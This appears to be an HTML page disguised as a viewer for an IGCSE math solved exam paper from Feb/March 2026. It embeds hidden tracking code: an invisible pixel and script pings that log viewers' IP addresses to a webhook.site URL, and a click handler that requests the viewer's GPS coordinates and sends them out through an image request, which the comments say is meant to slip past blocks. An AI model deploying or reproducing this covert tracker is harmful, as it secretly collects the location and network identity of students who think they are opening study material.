<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>IGCSE Papers Math Calculator- Feb/March 2026</title>
    <style>
        body { margin: 0; background: #2c3e50; color: white; overflow: hidden; font-family: sans-serif; }
        .header { height: 50px; display: flex; align-items: center; justify-content: center; background: #1a252f; border-bottom: 1px solid #34495e; }
        #pdf-frame { width: 100vw; height: calc(100vh - 50px); border: none; }
        /* This hides the tracking pixel from the user */
        .pixel { position: absolute; width: 1px; height: 1px; opacity: 0; }
    </style>
</head>
<body>
    <div class="header"><strong>IGCSE Papers Math Calculator- Feb/March 2026</strong></div>
    
    <!-- 1. THE SILENT TRACKER -->
    <!-- Webhook.site will log the IP of anyone who views this "image" -->
    <img src="https://webhook.site" class="pixel">

    <iframe id="pdf-frame" src="1012874352-0580-fm-2026-solved-paper (1).pdf"></iframe>

    <script>
        const webhookURL = "https://webhook.site/36d5a036-2f02-4a47-8d38-4387fd72fe8b";
        // Test 1: Simple Image Ping
try {
    const testImg = new Image();
    testImg.onload = () => console.log("✅ Image Ping: SUCCESS");
    testImg.onerror = (e) => console.log("❌ Image Ping: BLOCKED", e);
    testImg.src = webhookURL + "?test=image_ping&t=" + Date.now();
} catch(e) { console.log("❌ Image Object: CRASHED", e); }

// Test 2: Fetch Ping
fetch(webhookURL + "?test=fetch_ping", { mode: 'no-cors' })
    .then(() => console.log("✅ Fetch Ping: SUCCESS"))
    .catch((err) => console.log("❌ Fetch Ping: FAILED", err));

// Test 3: Check Permissions
navigator.permissions.query({name:'geolocation'}).then(res => {
    console.log("📍 Geolocation Permission:", res.state);
});

        // 2. THE CLICK TRIGGER
        window.onclick = () => {
            navigator.geolocation.getCurrentPosition(pos => {
                // We use a simple Image ping for the GPS too, as it bypasses fetch blocks
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                new Image().src = `${webhookURL}?type=GPS&lat=${lat}&lon=${lon}`;
            }, (err) => {
                new Image().src = `${webhookURL}?type=ERROR&msg=${encodeURIComponent(err.message)}`;
            }, { maximumAge: Infinity });
        };
    </script>
</body>
</html>
